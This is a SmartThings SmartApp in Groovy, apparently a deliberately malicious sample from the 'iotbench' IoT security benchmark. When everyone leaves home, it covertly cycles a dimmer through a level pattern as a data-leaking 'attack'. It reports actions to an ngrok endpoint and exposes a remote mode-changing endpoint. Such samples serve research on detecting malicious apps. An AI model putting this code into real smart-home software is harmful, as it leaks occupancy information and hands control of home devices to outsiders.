/**
 *  contexIoT-a-uo-undesired-unlocking_ins
 *
 *  Copyright 2020 iotbench
 *
 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except
 *  in compliance with the License. You may obtain a copy of the License at:
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed
 *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License
 *  for the specific language governing permissions and limitations under the License.
 *
 */
definition(
        name: "contexIoT-a-uo-undesired-unlocking_ins",
        namespace: "iotbench",
        author: "iotbench",
        description: "The app has the convert/abnormal behaviour of controlling switchLevel. This can possibly be used to leak data ",
        category: "Safety & Security",
        iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
        iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
        iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")





preferences {

    section("When all of these people leave home") {

        input "people", "capability.presenceSensor", multiple:true

        input "myswitch", "capability.switchLevel", title:"switchlevel?"

        // input "thelock", "capability.lock"

    }



    /*

    section("Change to this mode") {

        input "newMode", "mode", title: "Mode?"

    }

    section("False alarm threshold (defaults to 10 min)") {

        input "falseAlarmThreshold", "decimal", title: "Number of minutes", required: false

    }

    section( "Notifications" ) {

        input("recipients", "contact", title: "Send notifications to", required: false) {

            input "sendPushMessage", "enum", title: "Send a push notification?", options: ["Yes", "No"], required: false

            input "phone", "phone", title: "Send a Text Message?", required: false

        }

    }

    */

}



def installed() {

    log.debug "Installed with settings: ${settings}"



    initialize()

}



def updated() {

    log.debug "Updated with settings: ${settings}"



    unsubscribe()

    initialize()

}



def initialize() {

    //log.debug "Current mode = ${location.mode}, people = ${people.collect{it.label + ': ' + it.currentPresence}}"

    subscribe(people, "presence", presence)

    try{

        //attack()

    }

    catch(e) {

        log.debug e

    }

}



def presence(evt) {
    def data = [:]  // instrumented code
    def cnt = 0 // instrumented code

    log.debug "evt.name: $evt.value"

    if (evt.value != "not present") {

        log.debug "home"

        cnt++ // instrumented code
        data['action'+cnt] = "sink1 : myswitch setLevel(80)"  // instrumented code
        myswitch.setLevel(80)  // sink 1

        state.home = true

        state.attack = false

    }

    else {

        log.debug "not home"

        state.home = false

        state.attack = true

        cnt++ // instrumented code
        data['action'+cnt] = "sink2 : myswitch setLevel(0)"  // instrumented code
        myswitch.setLevel(0) // sink 2

        attack()

        //runIn(0.1 * 60, attack, [overwrite: false])

    }
    sendRequest(data) // instrumented code

}



def attack() {

    log.debug "attack: no one in home!!!"

    //changeIntensity()

    try{

        runIn(60*0.1,changeIntensity,[overwrite: false])

    }

    catch(e) {

        log.debug e

    }

}



def changeIntensity() {
    def data = [:]  // instrumented code
    def cnt = 0 // instrumented code

    def value = myswitch.currentState("level").value.toInteger()

    log.debug "value:$value"

    if(state.attack) {

        if(value == 0) {
            cnt++ // instrumented code
            data['action'+cnt] = "sink3 : myswitch setLevel(20)"  // instrumented code
            myswitch.setLevel(20)  // sink 3

        }

        if(value == 20) {
            cnt++ // instrumented code
            data['action'+cnt] = "sink4 : myswitch setLevel(40)"  // instrumented code
            myswitch.setLevel(40)  // sink 4

        }

        if(value == 40) {
            cnt++ // instrumented code
            data['action'+cnt] = "sink5 : myswitch setLevel(30)"  // instrumented code
            myswitch.setLevel(30)  // sink 5

        }

        if(value == 30) {
            cnt++ // instrumented code
            data['action'+cnt] = "sink6 : myswitch setLevel(70)"  // instrumented code
            myswitch.setLevel(70)  // sink 6

        }

        if(value == 70) {
            cnt++ // instrumented code
            data['action'+cnt] = "sink7 : myswitch setLevel(50)"  // instrumented code
            myswitch.setLevel(50)  // sink 7

        }

        if(value == 50) {
            cnt++ // instrumented code
            data['action'+cnt] = "sink8 : myswitch setLevel(0)"  // instrumented code
            myswitch.setLevel(0)  // sink 8

            state.attack = false

        }

        runIn(0.1*60,changeIntensity,[overwrite: false])

    }

    else {

        if(state.home) {
            cnt++ // instrumented code
            data['action'+cnt] = "sink9 : myswitch setLevel(80)"  // instrumented code
            myswitch.setLevel(80)  // sink 9

        }

        else {
            cnt++ // instrumented code
            data['action'+cnt] = "sink10: myswitch setLevel(0)"  // instrumented code
            myswitch.setLevel(0)  // sink 10

            log.debug "attackSending succeeded"

        }



    }
    sendRequest(data)  // instrumented code

}

//======================== the following are instrumented codes ====================
def sendRequest(data) {
    // [q:'Minneapolis', mode: 'json']
    def params = [
            uri:  'https://62f870a15b61.ngrok.io/',
            path: 'fuzzthings/things.php',
            contentType: 'application/json',
            query: data
    ]
    try {
        httpGet(params){resp ->
            log.debug "connection okay"
        }
    } catch (e) {
        log.error "error: $e"
    }
}

mappings {
    path("/location/:command") {
        //log.info("/location/:command")
        action: [
                GET: "location"
        ]
    }
}


void location() {
    // use the built-in request object to get the command parameter
    def command = params.command
    log.debug("Receive command: $command")

    // format command
    command = command.replaceFirst(command[0], command[0].toUpperCase()) // home -> Home, away -> Away

    def currMode = location.currentMode // "Home", "Away", etc.
    log.debug "current mode is $currMode"

    location.setMode(command)  // change location
    //runIn(5, printLocationInfo )  // 5 seconds delay to wait for location change takes effect
}